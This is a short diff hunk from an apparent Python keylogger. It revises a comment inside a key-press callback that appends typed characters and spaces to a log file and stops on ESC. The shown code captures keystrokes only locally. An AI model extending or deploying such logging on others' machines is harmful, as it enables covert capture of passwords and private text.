@@ -21,7 +21,7 @@ def on_press(key):
             f.write(f"{key.char}") #key.char is used to get character of the keys pressed alphanumeric key
     except AttributeError: #exemptblock handles different types of keys pressed 'special'
         with open(log_file, "a") as f:
-            f.write(f" {" "} ") #write special key (like 'key.space') o the log file
+            f.write(f" {" "} ") #write special key (space) in the log file
 
 #stop listener if "ESC" key is pressed
     if key == keyboard.Key.esc:
